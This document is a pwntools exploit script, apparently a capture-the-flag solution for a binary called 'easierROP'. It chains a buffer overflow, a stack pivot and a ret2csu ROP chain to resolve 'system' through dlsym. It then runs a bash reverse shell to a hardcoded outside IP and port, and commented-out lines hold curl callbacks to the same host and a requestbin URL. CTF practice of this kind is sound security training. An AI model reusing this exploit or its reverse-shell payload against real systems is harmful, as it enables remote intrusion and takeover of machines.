from pwn import *
import time
import sys


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    pop_rdi = 0x0000000000400cb3
    pop_rsi_r15 = 0x0000000000400cb1
    call_rax = 0x00000000004006f0
    jmp_rax = 0x00000000004007e1
    exit_got = 0x601fc0
    dlsym_got = 0x601fe8
    csu_init = 0x400caa
    call_init = 0x400c90
    leave_ret = 0x00000000004008ea
    
    offset_ary = [0x390, 0x450, 0x4b0]
    mybuf = 0x6020e0
    new_stack = mybuf + offset_ary[0]
    write_str = mybuf + offset_ary[1]
    parent_rop = mybuf + offset_ary[2]
    write_got = new_stack + 0x8

    system_str = write_str + 0x8
    reverse_shell = system_str + 0x8

    buf = b'A' * 0x30
    buf += flat(new_stack - 8, leave_ret)
    print(hex(len(buf)))
    buf = buf.ljust(offset_ary[0])
    #buf += flat(pop_rsi_r15, 0, 0)
    buf += flat(csu_init, 0, 1, dlsym_got, 0, write_str, 0x100, call_init, 0xdeadbeef)
    buf += flat(0, 1, write_got, 1, parent_rop, 0x200, call_init, 0xdeadbeef)
    buf += flat(0, 1, exit_got, 0xde, 0, 0, call_init)
    print(hex(len(buf)))
    buf = buf.ljust(offset_ary[1])
    buf += b'write\x00'.ljust(0x8)
    buf += b'system\x00'.ljust(0x8)
    buf += b'/bin/bash -c \'/bin/bash -i >& /dev/tcp/140.113.209.18/8787 0>&1\'\x00'
    #buf += b'/usr/bin/curl http://140.113.209.18:8787\x00'
    print(hex(len(buf)))
    buf = buf.ljust(offset_ary[2])
    buf += b'B' * 0x38
    buf += flat(pop_rsi_r15, 0, 0)

    #buf += flat(csu_init, 0, 1, dlsym_got, 0, system_str + 7, 0, call_init, 0xdeadbeef)
    #buf += flat(0, 1, 0, 1, 2, 3, pop_rdi, 0, pop_rsi_r15, mybuf, 0, call_rax)

    buf += flat(csu_init, 0, 1, dlsym_got, 0, system_str, 0, call_init, 0xdeadbeef)
    buf += flat(0, 1, 0, 1, 2, 3, pop_rdi, reverse_shell, call_rax)
    print(hex(len(buf)))
    #buf = buf.ljust(0x800, b'\x00')
    #buf = buf.ljust(0x700)
    #buf += b'/bin/bash -c \'/bin/bash -i >& /dev/tcp/140.113.209.18/8787 0>&1\'\x00'.ljust(0x50)
    #buf += b'sleep 100\x00'.ljust(0x50)
    #buf += b'/bin/ls\x00'.ljust(0x50)
    #buf += b'curl http://requestbin.net/r/1736yvq1\x00'.ljust(0x50)
    #buf += b'curl http://140.113.209.18:8787\x00'.ljust(0x50)
    #buf += b'system\x00'
    #buf += flat(csu_init, 0, 1, exit_got, 0xde, 0, 0, call_init, 0xdeadbeef)
    proc.send(buf)
    input('wait')


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc eof.ais3.org 19091'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./easierROP'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
